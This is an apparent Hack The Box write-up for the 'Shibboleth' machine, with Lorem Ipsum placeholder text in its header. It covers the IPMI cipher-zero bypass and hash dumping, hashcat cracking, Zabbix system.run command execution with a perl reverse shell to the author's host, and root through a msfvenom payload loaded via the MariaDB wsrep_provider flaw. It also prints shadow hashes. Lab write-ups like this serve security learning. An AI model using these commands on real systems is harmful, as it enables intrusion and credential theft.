---
layout: single
title: Shibboleth - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2021-11-23
classes: wide
header:
  teaser: /assets/images/htb-writeup-shibboleth/shibboleth_logo.png
  teaser_home_page: true
  icon: /assets/images/htb.png
categories:
  - hackthebox
  - infosec
tags:  
  - osticket
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-shibboleth/shibboleth_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------

# USER

### Step 1

**nmap:**
```bash
┌──(void㉿void)-[/htb/shibboleth]
└─$ nmap -Pn -n -sCV 10.10.11.124  
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://shibboleth.htb/
Service Info: Host: shibboleth.htb

┌──(void㉿void)-[/htb/shibboleth]
└─$ sudo nmap -sU shibboleth.htb                                                   
PORT    STATE SERVICE
623/udp open  asf-rmcp

```

**dirb:**
```bash
==> DIRECTORY: http://shibboleth.htb/assets/
==> DIRECTORY: http://shibboleth.htb/forms/
+ http://shibboleth.htb/index.html (CODE:200|SIZE:59474)
+ http://shibboleth.htb/server-status (CODE:403|SIZE:279)
```

**nikto:**
```bash
+ Server: Apache/2.4.41 (Ubuntu)
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD
```

**ffuf:**
```bash
┌──(void㉿void)-[/htb/shibboleth]
└─$ ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://shibboleth.htb -H "Host: FUZZ.shibboleth.htb" -fl 10
[... snip ...]
monitoring              [Status: 200, Size: 3686, Words: 192, Lines: 30]
monitor                 [Status: 200, Size: 3686, Words: 192, Lines: 30]
```

- **4 employees on shibboleth.htb**
	- **`./namemash.py /htb/shibboleth/users.txt > /htb/shibboleth/user-mash.txt`** 
- **Zabbix v5.x on monitor.shibboleth.htb**
- **IPMI-2.0 on UDP 623**

Reading about IPMI-2.0 there is a serious vulnerability via "Cipher 0", leading to a authentication bypass. To **identify** if the target is vulnerable we can use:
```bash
msf6 > use auxiliary/scanner/ipmi/ipmi_version
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.10.11.124
msf6 auxiliary(scanner/ipmi/ipmi_version) > run
[*] Sending IPMI requests to 10.10.11.124->10.10.11.124 (1 hosts)
[+] 10.10.11.124:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0)

msf6 auxiliary(scanner/ipmi/ipmi_version) > use auxiliary/scanner/ipmi/ipmi_cipher_zero
msf6 auxiliary(scanner/ipmi/ipmi_cipher_zero) > set rhosts 10.10.11.124
msf6 auxiliary(scanner/ipmi/ipmi_cipher_zero) > run
[*] Sending IPMI requests to 10.10.11.124->10.10.11.124 (1 hosts)
[+] 10.10.11.124:623 - IPMI - VULNERABLE: Accepted a session open request for cipher zero
```

<br>

We can abuse this issue with `ipmitool`, however it requires a valid user so loop through different user lists to get a hit.
```bash
┌──(void㉿void)-[/htb/shibboleth]
└─$ for i in $(cat /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt); do ipmitool -I lanplus -C 0 -H 10.10.11.124 -U $i -P randomjunkpass user list; done
Error: Unable to establish IPMI v2 / RMCP+ session
Error: Unable to establish IPMI v2 / RMCP+ session
Error: Unable to establish IPMI v2 / RMCP+ session
ID  Name	     Callin  Link Auth	IPMI Msg   Channel Priv Limit
1                    true    false      false      USER
2   Administrator    true    false      true       USER
3                    true    false      false      Unknown (0x00)
4                    true    false      false      Unknown (0x00)
5                    true    false      false      Unknown (0x00)
6                    true    false      false      Unknown (0x00)
7                    true    false      false      Unknown (0x00)
8                    true    false      false      Unknown (0x00)
9                    true    false      false      Unknown (0x00)
10                   true    false      false      Unknown (0x00)
11                   true    false      false      Unknown (0x00)
12                   true    false      false      Unknown (0x00)
13                   true    false      false      Unknown (0x00)
14                   true    false      false      Unknown (0x00)
15                   true    false      false      Unknown (0x00)
16                   true    false      false      Unknown (0x00)
17                   true    false      false      Unknown (0x00)
18                   true    false      false      Unknown (0x00)
19                   true    false      false      Unknown (0x00)
20                   true    false      false      Unknown (0x00)
21                   true    false      false      Unknown (0x00)
22                   true    false      false      Unknown (0x00)
23                   true    false      false      Unknown (0x00)
24                   true    false      false      Unknown (0x00)
25                   true    false      false      Unknown (0x00)
26                   true    false      false      Unknown (0x00)
27                   true    false      false      Unknown (0x00)
28                   true    false      false      Unknown (0x00)
29                   true    false      false      Unknown (0x00)
30                   true    false      false      Unknown (0x00)
31                   true    false      false      Unknown (0x00)
32                   true    false      false      Unknown (0x00)
33                   true    false      false      Unknown (0x00)
34                   true    false      false      Unknown (0x00)
35                   true    false      false      Unknown (0x00)
36                   true    false      false      Unknown (0x00)
37                   true    false      false      Unknown (0x00)
38                   true    false      false      Unknown (0x00)
39                   true    false      false      Unknown (0x00)
40                   true    false      false      Unknown (0x00)
41                   true    false      false      Unknown (0x00)
42                   true    false      false      Unknown (0x00)
43                   true    false      false      Unknown (0x00)
44                   true    false      false      Unknown (0x00)
45                   true    false      false      Unknown (0x00)
46                   true    false      false      Unknown (0x00)
47                   true    false      false      Unknown (0x00)
48                   true    false      false      Unknown (0x00)
49                   true    false      false      Unknown (0x00)
50                   true    false      false      Unknown (0x00)
51                   true    false      false      Unknown (0x00)
52                   true    false      false      Unknown (0x00)
53                   true    false      false      Unknown (0x00)
54                   true    false      false      Unknown (0x00)
55                   true    false      false      Unknown (0x00)
56                   true    false      false      Unknown (0x00)
57                   true    false      false      Unknown (0x00)
58                   true    false      false      Unknown (0x00)
59                   true    false      false      Unknown (0x00)
60                   true    false      false      Unknown (0x00)
61                   true    false      false      Unknown (0x00)
62                   true    false      false      Unknown (0x00)
63                   true    false      false      Unknown (0x00)
Error: Unable to establish IPMI v2 / RMCP+ session
Error: Unable to establish IPMI v2 / RMCP+ session
Error: Unable to establish IPMI v2 / RMCP+ session
```

----------

<br>

### Step 2

With a known IPMI user we can extract it's password hash using `scanner/ipmi/ipmi_dumphashes`, change the Administrator password using `ipmitool`, or even create a new user. Because of OPSEC reasons we chose to go with the first.
```bash
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.10.11.124
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.10.11.124:623 - IPMI - Hash found: Administrator:25c57b7b8405000008904066caa92e976c68e804989073044e82977617542af3e0def24a61f3bb61a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:9bcd1814a60990cec7b9579c2236c1a55465af4a
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Crack the hash with hashcat:
```powershell
PS C:\tools\hashcat-6.2.4> .\hashcat.exe -a0 -m7300 .\administrator-ipmi.txt .\rockyou.txt
[... snip ...]

25c57b7b8405000008904066caa92e976c68e804989073044e82977617542af3e0def24a61f3bb61a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:9bcd1814a60990cec7b9579c2236c1a55465af4a:ilovepumkinpie1

Session..........: hashcat
Status...........: Cracked
```

**Credentials found! `Administrator:ilovepumkinpie1`**

The credentials work in [Zabbix](http://monitor.shibboleth.htb), giving us an Initial Foothold.

<br>

_**BONUS: Create ADMINISTRATOR User (not relevant for this box)**_
```bash
$ ipmitool -I lanplus -C 0 -H 10.10.11.124 -U Administrator -P randomjunkpass user set name 3 p3           
$ ipmitool -I lanplus -C 0 -H 10.10.11.124 -U Administrator -P randomjunkpass user set password 3 p3       
Set User Password command successful (user 3)

$ ipmitool -I lanplus -C 0 -H 10.10.11.124 -U Administrator -P randomjunkpass user set priv 3 4     
User Commands:
               summary      [<channel number>]
               list         [<channel number>]
               set name     <user id> <username>
               set password <user id> [<password> <16|20>]
               disable      <user id>
               enable       <user id>
               priv         <user id> <privilege level> [<channel number>]
                     Privilege levels:
                      * 0x1 - Callback
                      * 0x2 - User
                      * 0x3 - Operator
                      * 0x4 - Administrator
                      * 0x5 - OEM Proprietary
                      * 0xF - No Access

               test         <user id> <16|20> [<password]>

$ ipmitool -I lanplus -C 0 -H 10.10.11.124 -U Administrator -P randomjunkpass user priv 3 4                                                            1 ⨯
Set Privilege Level command successful (user 3)
$ ipmitool -I lanplus -C 0 -H 10.10.11.124 -U Administrator -P randomjunkpass user list    
ID  Name	     Callin  Link Auth	IPMI Msg   Channel Priv Limit
1                    true    false      false      USER
2   Administrator    true    false      true       USER
3   p3               true    false      false      ADMINISTRATOR
```



-------

<br>

### Step 3
After a LOT of time going through Zabbix I found [this post](https://stackoverflow.com/questions/24222086/how-to-run-command-on-zabbix-agents) explaining how to execute commands from the server through `items`.

First, go to **Configuration > Hosts > Items**

![[Pasted image 20211124085038.png]]

<br>

In the top right corner, press `Create Item`. Name it to whatever and in the Key-field execute code with the syntax: `system.run[command]`. Save your new item, press on it to and  in the bottom row press `Execute now`. A simple ping POC would look like this:

![[Pasted image 20211124085238.png]]

![[Pasted image 20211124085403.png]]

<br>

Trying to execute one liners directly through the GUI gives me a shell that closes down only after a few seconds. So instead I host a local HTTP Server that exposes a pearl one-liner, and trigger it using curl from the GUI. 

```bash
$ cat rev.sh      
perl -e 'use Socket;$i="10.10.14.6";$p=4488;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

![[Pasted image 20211124092000.png]]

```bash
┌──(void㉿void)-[/htb/shibboleth]
└─$ nc -lvnp 4488
listening on [any] 4488 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.11.124] 38550
/bin/sh: 0: can't access tty; job control turned off
$ id && hostname
uid=110(zabbix) gid=118(zabbix) groups=118(zabbix)
shibboleth
```

-------------

<br>

### Step 4
The admin loves password re-use; change to user `ipmi-svc` password `ilovepumkinpie1`.

```bash
zabbix@shibboleth:/$ su ipmi-svc
Password: ilovepumkinpie1
ipmi-svc@shibboleth:/$ cd 
ipmi-svc@shibboleth:~$ cat user.txt 
1c61257210be4a423aeae88f727c2412
```

-------------

<br>

# ROOT

### Step 1 
- `Sorry, user ipmi-svc may not run sudo on shibboleth.`

Looking for passwords etc in `/etc/zabbix` we find database credentials. From the database we are able to extract three bcrypt (`$2*$`) hashes, however we already know Administrator.
```bash
ipmi-svc@shibboleth:/etc/zabbix$ cat zabbix_server.conf
[... snip ...]
DBName=zabbix
DBUser=zabbix
DBPassword=bloooarskybluh

ipmi-svc@shibboleth:/etc/zabbix$ mysql zabbix -u zabbix -p
Enter password: bloooarskybluh

MariaDB [zabbix]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| zabbix             |
+--------------------+

MariaDB [zabbix]> select * from users;
+--------+---------------+--------------+---------------+--------------------------------------------------------------+-----+-----------+------------+-------+---------+------+------------+----------------+---------------+---------------+---------------+
| userid | alias         | name         | surname       | passwd                                                       | url | autologin | autologout | lang  | refresh | type | theme      | attempt_failed | attempt_ip    | attempt_clock | rows_per_page |
+--------+---------------+--------------+---------------+--------------------------------------------------------------+-----+-----------+------------+-------+---------+------+------------+----------------+---------------+---------------+---------------+
|      1 | Admin         | Zabbix       | Administrator | $2y$10$L9tjKByfruByB.BaTQJz/epcbDQta4uRM/KySxSZTwZkMGuKTPPT2 |     |         0 | 0          | en_GB | 60s     |    3 | dark-theme |              0 | 192.168.139.9 |    1619285020 |            50 |
|      2 | guest         |              |               | $2y$10$89otZrRNmde97rIyzclecuk6LwKAsHN0BcvoOKGjbT.BwMBfm7G06 |     |         0 | 15m        | en_GB | 30s     |    1 | default    |              0 |               |             0 |            50 |
|      3 | Administrator | IPMI Service | Account       | $2y$10$FhkN5OCLQjs3d6C.KtQgdeCc485jKBWPW4igFVEgtIP3jneaN7GQe |     |         0 | 0          | en_GB | 60s     |    2 | default    |              0 |               |             0 |            50 |
+--------+---------------+--------------+---------------+--------------------------------------------------------------+-----+-----------+------------+-------+---------+------+------------+----------------+---------------+---------------+---------------+

```

Cracking the hashes is however useless and probably a rabbit hole. Guest comes back empty and after 30 minutes I gave up with Admin.

-------------

<br>

### Step 2
Digging around further into the running process we can see that mysql is running as root, something that's not best practice at all.

```bash
ipmi-svc@shibboleth:/etc/ayelow$ ps aux | grep root
[... snip ...]
root        1252  0.0  0.0   2608  1732 ?        S    07:08   0:00 /bin/sh /usr/bin/mysqld_safe
root        1412  0.5  3.5 1729516 143560 ?      Sl   07:08   0:49 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/x86_64-linux-gnu/mariadb19/plugin --user=root --skip-log-error --pid-file=/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock
```

Reading around for vulnerabilities for MariaDB v10.3.25 I come across [CVE-2021-27928](https://packetstormsecurity.com/files/162177/MariaDB-10.2-Command-Execution.html) which allows an authenticated attacker to execute OS commands as the user running the SQL service. Sound perfect to us! 

```bash
┌──(void㉿void)-[/htb/shibboleth]
└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.6 LPORT=4499 -f elf-so -o CVE-2021-27928.so
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf-so file: 476 bytes
Saved as: CVE-2021-27928.so
```
```bash
ipmi-svc@shibboleth:/dev/shm$ wget http://10.10.14.6/CVE-2021-27928.so
ipmi-svc@shibboleth:/dev/shm$ mysql -u zabbix -p -h 127.0.0.1 -e 'SET GLOBAL wsrep_provider="/dev/shm/CVE-2021-27928.so";'
Enter password: 
ERROR 2013 (HY000) at line 1: Lost connection to MySQL server during query
```
```bash
┌──(void㉿void)-[/htb/shibboleth]
└─$ nc -lvnp 4499                                                                                     
listening on [any] 4499 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.11.124] 33832
id && hostname
uid=0(root) gid=0(root) groups=0(root)
shibboleth

cat /root/root.txt
04543075052e692020a01b60d8670c0f

cat /etc/shadow
[... snip ...]
root:$6$HeRqkRJL9pttp4EY$TBE4vztPy9lOaywPhVdhQHwiPa09s7RJw418EMjmS0RKea/1QBwLqTHK84ato5yDBF59dMvSNbQQ1pVy.K1dp.:18741:0:99999:7:::
ipmi-svc:$6$rnKUQQE9QwT1bVVt$7JWeqxtaYfMZa0EO0clguLK4Fh3N/IN6djXUl2M2MQ5PHVmQ1vLwlxnNMVhn7y/oEpjltVyvbw1wbBBZ//apV.:18925:0:99999:7:::
```


------

# References
**zabbix agent code execution:**
https://stackoverflow.com/questions/24222086/how-to-run-command-on-zabbix-agents

**mariadb os command execution:**
https://packetstormsecurity.com/files/162177/MariaDB-10.2-Command-Execution.html